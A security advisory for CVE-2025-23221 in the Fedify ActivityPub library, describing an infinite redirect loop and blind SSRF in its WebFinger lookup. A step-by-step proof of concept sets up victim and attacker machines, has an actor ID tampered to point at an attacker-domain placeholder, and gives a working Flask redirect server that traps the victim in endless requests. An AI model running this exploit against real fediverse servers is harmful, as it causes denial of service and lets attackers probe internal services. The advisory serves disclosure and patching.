---
description: CVE-2025-23221 Medium severity. Infinite loop and Blind SSRF found inside the WebFinger mechanism
title: Fedify WebFinger Infinite Loop and Blind SSRF 
date_published: "2025-01-20"
last_updated: "2025-01-20"
xray_id:
vul_id: CVE-2025-23221
cvss: 5.4
severity: medium
discovered_by: Natan Nehorai
type: vulnerability
---
## Summary
This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.



## Component

[@fedify/fedify](https://www.npmjs.com/package/@fedify/fedify)



## Affected versions

(,1.0.13]

(,1.1.10]

(,1.2.10]

(,1.3.3]



## Description

The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (https://www.w3.org/TR/activitypub/#security-considerations), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.

The **lookupWebFinger** function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.

## PoC

1. In order to show a use case of the vulnerability, we can use the demo app presented at this URL: https://github.com/dahlia/microblog
2. We will create two machines, victim and attacker, each one on a different server with different domains.

**_Victim Machine_**



1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.

   

2. Install a Deno server:
  `
  curl -fsSL https://deno.land/install.sh | sh
  `
  `
  source ~/.bashrc
  `
  `
  deno --version #check deno is working
  `

  

3. Pull the git repository of the victim blog app:
  `
  git clone https://github.com/dahlia/fedify.git
  `

  

4. Modify the federation object to remove signature checks for the sake of easy testing:
  On file **_/examples/blog/federation/mod.ts_** edit the **_createFederation<void>_** object the following attribute: **_skipSignatureVerification: true_**.

  

5. Change into the blog app directory ( /examples/blog ) and run the app:
  `
  deno task preview
  `

  

6. Surf to the application on the browser, and register a user on the app.

   

**_Attacker Machine_**



1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.

   

2. Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
  `
  curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
  `
  `
  source ~/.bashrc
  `
  `
  nvm list-remote
  `

  

3. Install the latest stable version:
  `
  nvm install {latest_ver} #for example: v20.10.0
  `
  `
  source ~/.bashrc
  `
  `
  npm -v #check it works
  `
  `
  node -v #check it works
  `

  

4. Download the attacker app repository:
  `
  git clone https://github.com/dahlia/microblog.git
  `

  

5. Disable request signature validations:
  Edit the **_/src/federation.ts_** file and add a **_skipSignatureVerification: true_** attribute to the **_createFederation_** object.

  

6. Modify the **_/src/federation.ts_** file and tamper with the Person object on the actor dispatcher ( **_setActorDispatcher(\"/users/{identifier}\"_** ) - change the actor ID attribute **_“id: ctx.getActorUri(identifier)_**” into “**_id: new URL(‘http://<ATTACKER_MACHINE_DOMAIN>:1337/users/enterloop’)_**”.

   

7. Install Python flask and create the Python Flask redirect server:
  `
  apt update
  `
  `
  apt install python3-flask
  `

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/health')
def health():
    return \"hello\", 200

@app.route('/.well-known/webfinger')
def ssrfinger():
    return redirect(\"http://<ATTACKER_MACHINE_DOMAIN>:1337/endlessloop\")

@app.route('/endlessloop')
def endlessloop():
    return redirect(\"http://<ATTACKER_MACHINE_DOMAIN>:1337/endlessloop\")

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0' ,port=1337)
```


8. Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.

   

9. Read the **_README.txt_** file on the attacker app and follow the instructions on how to execute the app.

   

10. Surf the app on the browser and attempt to follow the federated user on the victim’s machine.

    

11. Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).



## Vulnerability Mitigations

No mitigations are provided for this vulnerability.



## References

[GHSA](https://github.com/fedify-dev/fedify/security/advisories/GHSA-c59p-wq67-24wx)